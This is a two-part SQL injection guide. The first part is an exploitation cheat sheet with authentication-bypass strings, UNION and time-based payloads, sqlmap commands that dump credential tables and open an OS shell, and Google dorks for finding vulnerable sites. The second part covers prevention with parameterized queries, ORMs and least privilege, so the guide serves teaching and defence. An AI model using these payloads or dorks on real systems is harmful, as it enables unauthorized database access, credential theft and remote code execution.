# SQL Injection – Hunting & Exploitation Cheat Sheet

**SQL Injection (SQLi)** is a technique attackers use to gain unauthorized access to a web application's database by injecting malicious code into a database query.

**Web App Basics**  
- **Client Side** (Front End): HTML, CSS, JavaScript  
- **Server Side** (Backend): PHP, SQL, MySQL, etc.

**Example Vulnerable Query**  
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

**Sample Database Table**  
| id | Username | Password |
|----|----------|----------|
| 1  | Admin    | admin    |
| 2  | John     | Don123   |

**Logical Operators Quick Ref**  

| Expression       | Result |
|------------------|--------|
| True AND True    | True   |
| True AND False   | False  |
| False AND True   | False  |
| False AND False  | False  |
| True OR True     | True   |
| True OR False    | True   |
| False OR True    | True   |
| False OR False   | False  |

## Classic Authentication Bypass Payloads

- `' OR 1=1 -- `  
  → Makes condition always true (1=1), `--` comments out the rest  
  Rendered query:  
  ```sql
  SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='...'
  ```

- `' OR 1=1 #` (MySQL comment alternative)  
- `admin' -- `  
- `admin' #`  
- `') OR '1'='1 -- `  
- Common lists (try in username/password fields):  
  - `xyz' OR 1=1 -- `  
  - `xyz' OR 1=1 # `  
  - `test' OR 1=1 -- `  
  - `admin' -- `  
  - `') OR ('1'='1 -- `

**Tip for Detection**  
- Input `'` (single quote) or `"` → If you see errors like **"SQL Syntax error"**, **"mysql_fetch_array()"**, **"on line X"**, or similar → **likely vulnerable**.

## Using Burp Suite – Manual Detection & Exploitation

1. **Crawling**  
   - Crawl every functionality (GET/POST parameters).

2. **Identify Enclosing Characters**  
   - Test: `1`, `'1`, `"1`, ``1``  
   - Look for errors or different Content-Length in response.  
   - Example: `artist=1\` → Warning: `mysql_fetch_array()` expects resource, boolean given...

3. **Determine Vulnerable Parameter & Column Count**  
   - Use safe base: `artist=1 --+` (no error)  
   - **Find column count**:  
     ```
     artist=1 ORDER BY 1 --+
     artist=1 ORDER BY 2 --+
     ...
     ```
     → Increase until error → last working number = column count (e.g., 3 columns).

4. **Find Vulnerable Columns (UNION-based)**  
   ```
   artist=-1 UNION SELECT 1,2,3 --+
   ```
   → Check which numbers appear in page → those columns are injectable.

5. **Extract Database Info (MySQL)**  
   - Database name: `database()`  
   - Current user: `user()`  
   - Version: `version()`  

   Examples:  
   ```
   artist=-1 UNION SELECT 1,database(),user() --+
   artist=-1 UNION SELECT 1,user(),version() --+
   ```

   More functions: `BENCHMARK()`, `CHARSET()`, `COLLATION()`, `CONNECTION_ID()`, `CURRENT_USER()`, `LAST_INSERT_ID()`, `ROW_COUNT()`, `SCHEMA()`, `SESSION_USER()`

## Blind / Time-Based SQL Injection

**Detection** (no visible output/error)  
- Delay-based:  
  ```
  1 OR SLEEP(5) --+
  1' OR SLEEP(5) --+
  1 OR SLEEP(5)#
  ```
  → Page loads ~5 seconds later → vulnerable.

**Burp Intruder** for automation:  
- Send request → Positions → Add § around injectable spot  
- Payloads → Load list → Encoder: no encoding for space  
- Attack → Check response times.

## SQLmap – Automated Exploitation (Kali)

1. Save vulnerable request (e.g., from Burp) as `sql.txt`  
   Mark injectable spot with `*`:  
   ```
   GET /artists.php?artist=1* HTTP/1.1
   ```

2. Basic scan:  
   ```
   sqlmap -r sql.txt --banner
   sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -b
   ```

   → Reveals DB: MySQL >=5.0, version, OS, etc.

3. List databases:  
   ```
   sqlmap -r sql.txt --dbs
   ```

4. Tables:  
   ```
   sqlmap -r sql.txt -D acuart --tables
   ```

5. Columns & Dump:  
   ```
   sqlmap -r sql.txt -D acuart -T users --columns --dump
   sqlmap -r sql.txt -D acuart -T users -C uname,pass --dump
   ```

6. OS-Shell (if possible → RCE):  
   ```
   sqlmap -r sql.txt --os-shell
   ```

## Manual Exploitation via Address Bar (e.g., testphp.vulnweb.com)

**Steps**

1. **Confirm vulnerability**  
   ```
   ?artist=1'
   ?artist=1"
   ?artist=1)
   ?artist=1--
   ?artist=1;
   ```
   → Error like `mysql_fetch_array()` → vulnerable.

2. **Column count**  
   ```
   ?artist=1 ORDER BY 1--
   ?artist=1 ORDER BY 2--
   ?artist=1 ORDER BY 3--
   ```
   → Error at 4 → 3 columns.

3. **Table names**  
   ```
   ?artist=-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
   ```

4. **Column names** (e.g., from table `users`)  
   ```
   ?artist=-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name="users"--
   ```

5. **Dump data**  
   ```
   ?artist=-1 UNION SELECT 1,2,group_concat(uname) FROM users--
   ?artist=-1 UNION SELECT 1,2,group_concat(uname,0x3a,pass) FROM users--
   ```

**Useful Resources**  
- [PayloadsAllTheThings – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)  
- [Advanced SQL Injection Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)  
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)  
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Google Dorks for Finding Potential Targets** (use responsibly)  
- `inurl:"id=" intext:"mysql_fetch"`  
- `inurl:"php?id=" intitle:"index of"`  
- Full lists: Search GitHub for "SQL injection dorks" (e.g., gists with 100+ dorks).

**Warning**  
SQL Injection is a **critical** vulnerability (OWASP Top 10). Use only on authorized targets (e.g., labs like vulnweb.com). Exploitation without permission is illegal.

Good luck hunting responsibly! 🛡️


-------------------------------------

# SQL Injection (SQLi) Mitigations

SQL Injection remains one of the most dangerous and persistent web vulnerabilities (still in OWASP Top 10 under **A03:2021 – Injection** and continuing into recent years). The good news: **most SQLi can be completely prevented** with modern, standard practices.

Here are the **proven, ranked mitigations** (based on OWASP SQL Injection Prevention Cheat Sheet and current security guidance):

| Priority | Mitigation                          | Effectiveness | When to Use / Notes                                                                 | Example (Pseudo-code) |
|----------|-------------------------------------|---------------|-------------------------------------------------------------------------------------|-----------------------|
| ★★★★★    | **Use Prepared Statements / Parameterized Queries** | **Primary & strongest defense** | Almost all languages/frameworks support this. Prevents injection by design.       | See below |
| ★★★★     | **Use Object-Relational Mappers (ORMs)** | Very high     | Modern apps: Hibernate, Entity Framework, Django ORM, Prisma, SQLAlchemy, etc.   | Automatic parameterization |
| ★★★★     | **Principle of Least Privilege** on DB accounts | High          | Limit DB user to only needed operations (SELECT, INSERT, no DROP/ALTER).         | DB user: read-only where possible |
| ★★★      | **Proper Input Validation & Whitelisting** | Defense-in-depth | Validate format, length, type (e.g., numeric ID, email regex). Reject invalid.    | `if (!is_numeric($id)) reject();` |
| ★★★      | **Stored Procedures** (parameterized) | Good          | Safe if parameters are bound; avoid dynamic SQL inside.                           | `CALL get_user(?, ?)` |
| ★★       | **Web Application Firewall (WAF)** | Moderate      | Detects & blocks common payloads; good for legacy code, but **bypassable**.      | ModSecurity, Cloudflare WAF |
| ★★       | **Escape user input** (last resort) | Low / discouraged | Very error-prone; database-specific and context-dependent. OWASP strongly discourages as primary defense. | `mysql_real_escape_string()` → avoid |
| ★        | **Error message suppression** | Low           | Hide detailed errors from users; log them internally.                             | `display_errors = Off` |

### 1. Use Prepared Statements / Parameterized Queries (The #1 Rule)

This is the **gold standard** — it separates code from data.

**Examples by Language**

- **PHP (PDO – recommended)**
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? AND status = ?");
  $stmt->execute([$userId, 'active']);
  ```

- **PHP (MySQLi)**
  ```php
  $stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
  $stmt->bind_param("s", $username);
  $stmt->execute();
  ```

- **Node.js / JavaScript (mysql2 / pg)**
  ```js
  const [rows] = await connection.execute(
    'SELECT * FROM users WHERE email = ?',
    [userEmail]
  );
  ```

- **Python (SQLAlchemy)**
  ```python
  result = db.execute(
      text("SELECT * FROM users WHERE id = :id"),
      {"id": user_id}
  )
  ```

- **Java (JDBC)**
  ```java
  PreparedStatement stmt = conn.prepareStatement(
      "SELECT * FROM users WHERE username = ?"
  );
  stmt.setString(1, username);
  ```

- **C# (.NET)**
  ```csharp
  using (var cmd = new SqlCommand("SELECT * FROM Users WHERE Id = @Id", conn))
  {
      cmd.Parameters.AddWithValue("@Id", userId);
      // execute
  }
  ```

### 2. Use ORMs (They Handle Parameterization Automatically)

- Hibernate / JPA (Java)
- Entity Framework (C#)
- Django ORM (Python)
- Prisma / TypeORM (Node.js/TS)
- Laravel Eloquent (PHP)
- Ruby on Rails ActiveRecord

Example (Django):
```python
User.objects.filter(username=username, is_active=True)
# → automatically safe
```

### 3. Additional Strong Defenses

- **Least Privilege**  
  Create separate DB users/roles:  
  - Read-only for public-facing queries  
  - No `DROP`, `TRUNCATE`, `ALTER` rights  
  - Never use `root` / `sa` in production

- **Input Validation (Always Do This Too)**  
  ```php
  // Numeric ID
  $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
  if ($id === false) { http_response_code(400); exit; }

  // Email
  if (!filter_var($email, FILTER_VALIDATE_EMAIL)) { reject(); }
  ```

- **WAF as Extra Layer**  
  Deploy ModSecurity, Cloudflare, AWS WAF, Imperva, etc. — but **never rely only on WAF**.

- **Avoid Dangerous Patterns**  
  - Never concatenate user input: `"WHERE id = " . $_GET['id']`  
  - Avoid dynamic table/column names if possible  
  - If you must → use strict whitelists:  
    ```php
    $allowed_columns = ['id', 'name', 'email'];
    if (!in_array($sort_by, $allowed_columns)) die();
    ```

### Quick Checklist for Code Review / New Projects

- [ ] All dynamic queries use prepared statements / ORMs?
- [ ] DB connection uses least-privilege account?
- [ ] Input validated for type/format/length?
- [ ] No raw string concatenation in SQL?
- [ ] Errors not leaked to users?
- [ ] WAF / IDS in place for legacy code?
- [ ] Regular security testing (DAST + SAST)?

Follow the **official OWASP SQL Injection Prevention Cheat Sheet** for language-specific details:  
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

Implement these and SQLi becomes a non-issue in your app. Stay safe! 🛡️
